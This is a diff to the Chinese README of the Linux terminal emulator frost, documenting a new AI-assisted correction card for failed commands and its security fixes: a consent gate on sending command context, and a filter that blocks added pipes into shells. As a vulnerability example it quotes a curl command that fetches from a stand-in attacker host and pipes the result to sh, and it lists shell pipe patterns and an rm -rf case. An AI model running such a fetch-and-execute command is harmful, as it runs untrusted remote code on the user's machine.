@@ -87,6 +87,11 @@ frost 是一个面向 Linux 的现代终端模拟器，使用 Rust、iced 和 wg
   包装进程的本地 cwd 不代表其报告的工作目录，因此失败关闭；此外还要求主屏幕、提示符空闲、
   输入为空且开启 bracketed paste。被 16 KiB 上限截断的命令与 Background 块一律不进入
   Retry/Agent 路径
+- 失败命令的评审式纠正卡片（`command_correction_enabled`，默认关闭）：引擎与 anvil/forge/ember
+  共用 `jterm_core::command_correction`。本机可验证的证据（目标自身给出的拼写建议、APT 索引、
+  可执行 PATH）优先且从不联网；严格 JSON 的 AI 兜底另需 `ai_share_command_context = true`，
+  未授权时静默跳过。卡片内容全部经引擎脱敏，危险命令带 `⚠ destructive:` 标签，
+  未验证或被编辑过的候选只回填提示符、仍需自己按回车。详见“失败命令的评审式纠正”
 - PTY 启动采用 fork→exec 错误握手；无效目录、shell/exec 失败会显示可重试诊断而不是崩溃
 - 配置与快捷键热重载采用 last-known-good；坏文件会显示路径/行列并暂停自动写回
 - 字体探测与桌面通知只调用固定可信系统程序，独立进程组内并发有界读取 stdout/stderr，
@@ -411,15 +416,57 @@ ai_stream = true
 
 # 向非本地 AI provider 发送命令上下文（命令、cwd、捕获输出）的显式授权。
 # 直连本机回环 Ollama 不需要此项；继承的 HTTP 代理会取消该豁免。
+# 2026-08-29 起，失败命令纠正也受此开关约束（此前它根本不看这里）：
+# 关闭时（默认）不再向 provider 发送失败命令、工作目录和至多 8 KiB 终端输出，
+# AI 兜底整体静默；本机三类已验证纠正（目标自身建议、APT 索引、可执行 PATH）
+# 从不离开本机，行为不变。依赖 AI 纠正的用户需要显式打开此项。
 ai_share_command_context = false
-# 失败命令的评审式纠正卡片（需先开启 ai_enabled）：本机 PATH/APT 证据优先，
-# 未配置 provider 时跳过严格 JSON 的 AI 兜底；卡片上可编辑，确认后才运行或
-# 插入提示符（未验证或编辑过的候选仅插入，仍需自己按回车）。
+# 失败命令的评审式纠正卡片（需先开启 ai_enabled）：本机 PATH/APT 证据优先；
+# 严格 JSON 的 AI 兜底另需 ai_share_command_context = true（未授权或未配置
+# provider 时跳过）。卡片上可编辑，确认后才运行或插入提示符（未验证或编辑过的
+# 候选仅插入，仍需自己按回车）。详见下方“失败命令的评审式纠正”。
 command_correction_enabled = false
 # 实验性 Tasks 面板（侧栏 "Tasks" 页）：为失败命令块创建独立 Git worktree
 # 任务，并可选地运行原生 Codex 会话。与云端 AI 授权相互独立。
 experimental_task_sidebar = false
 ```
+
+### 失败命令的评审式纠正
+
+引擎自 2026-08-29 起由 `jterm_core::command_correction` 提供，与 anvil/forge/ember 共用同一份
+分类器、安全门、提示词与解析器；frost 侧只保留三样东西：构造引擎时声明的策略、按 pane 的请求
+登记表，以及卡片本身。合并四份各自漂移的私有副本时修掉了三处真实漏洞，因此**行为有可见变化**：
+
+- **AI 兜底现在受 `ai_share_command_context` 约束，而该项默认关闭。** 此前这个界面在
+  `ai_enabled` + `command_correction_enabled` 下就会直接把失败命令、工作目录和至多 8 KiB
+  终端输出发给 provider，不看这个授权开关（frost 在 `ai_chats`、`ai_command` 和 Tasks 面板里
+  一直是看的）。现在关闭时卡片只会来自本机验证过的证据：目标程序自己给出的拼写建议、本机 APT
+  索引、本机可执行 PATH。这三条从不联网，行为不变。**想继续获得 AI 纠正，请显式设置
+  `ai_share_command_context = true`。**
+- **候选命令不能新增通向 shell / 解释器的管道。** 旧的安全门只检查某个 shell 控制符号是否
+  “出现过”，所以当原命令本身就含有 `|` 时，追加 `| sh` 不引入任何新符号，能直接通过——
+  `curl -sS https://example.invalid/setup | head -20` 失败后，`curl -sS https://evil.invalid/x | sh`
+  可以出现在卡片里。新规则按引号安全地切分管道并比较各段实际运行的解释器集合，
+  `|  sh`（两个空格）、`| /bin/sh`、`| zsh`、`| python3`、`| xargs sh -c`、`| $SHELL` 同样拒绝；
+  而 `ls | gerp foo` → `ls | grep foo` 仍照常提供。
+- **卡片理由行经过脱敏与单行折叠。** provider 返回的 `message` 过去被原样插进可编辑、已预填、
+  已聚焦的命令输入框正上方的文本里，含 U+202E 的回复可以反转旁边文字的显示顺序；
+  现在双向覆盖字符渲染为 U+FFFD。行内错误提示同样被限制为单行 200 字符。
+- **卡片新增 `⚠ destructive:` 风险标签**，与 Agent 审批卡片一致，随草稿每次按键重算。
+  危险判定从来只决定“能否直接运行”（未验证候选本就不能直接运行），所以
+  `rm -rf ~/work` 这类建议此前与 `git status` 的外观完全相同。
+- **超过 16 KiB 的失败命令不再被分类**，也就不再排序、探测或送去询问模型——这个界面自身声明的
+  预算就是 16 KiB。
+- **已验证候选只差首尾空白时会照常直接运行**，提交的是去掉空白后的命令：按钮文案与实际提交
+  现在取自同一个已校验字符串，不会再一个说“插入待审”另一个却直接运行。
+- **PATH 目录扫描忽略相对与空的 PATH 项**，打开一个恰好位于相对 PATH 项上的项目，不会再把它的
+  文件名贡献成纠正候选。
+
+不变的一项，值得说明成本：自动探测只从固定绝对路径（`/usr/bin/bash`、`/bin/bash`、
+`/usr/local/bin/bash`、`/usr/bin/apt-cache`、`/bin/apt-cache`）解析 helper，并要求路径每一段
+都属系统所有且不可被组/其他人写入。frost 本来就是四端里唯一做对这件事的，因此这里没有回归；
+代价照旧——把 `apt-cache` 放在别处的非 FHS 主机拿不到 APT 证据，卡片会退化为未验证候选或干脆
+不出现。对一个“任何命令失败都会自动拉起子进程”的界面来说，这是正确的取舍。
 
 ### 实验性 Tasks 面板（原生 Codex 运行时）
 
@@ -517,6 +564,13 @@ frost 优先使用配套 shell [`jsh`](https://github.com/beamiter/jsh)，找不
 ## 安全说明
 
 终端控制序列来自本地或远程程序，不能天然视为可信输入。frost 默认拒绝 OSC 52/5522 读取宿主剪贴板；如果显式开启 `allow_clipboard_read`，通过 SSH 运行的程序也可能获得剪贴板内容。剪贴板写入仍按主流终端兼容行为允许。Kitty 图像、OSC 8 链接和通知均有资源、协议或频率限制。
+
+失败命令的纠正卡片是唯一会“因为命令失败而自动拉起子进程”的界面，因此它的探测只从固定绝对候选
+路径解析 helper，并要求路径每一段都属系统所有且不可被组/其他人写入；用户 `PATH` 上的同名程序
+既不会被信任，也根本不会被考虑。候选命令必须通过同一道安全门：不得新增 shell 控制语法、
+不得新增 `sudo`/`doas`/`su`、不得新增 SSH/SCP 类远程执行，也不得新增通向 shell 或解释器的管道。
+向 provider 发送失败命令、工作目录与终端输出需要 `ai_share_command_context`（默认关闭）；
+未授权时只提供本机验证过的纠正。任何候选都不会自动执行：未验证或被编辑过的候选只回填提示符。
 
 ## 开发验证
 
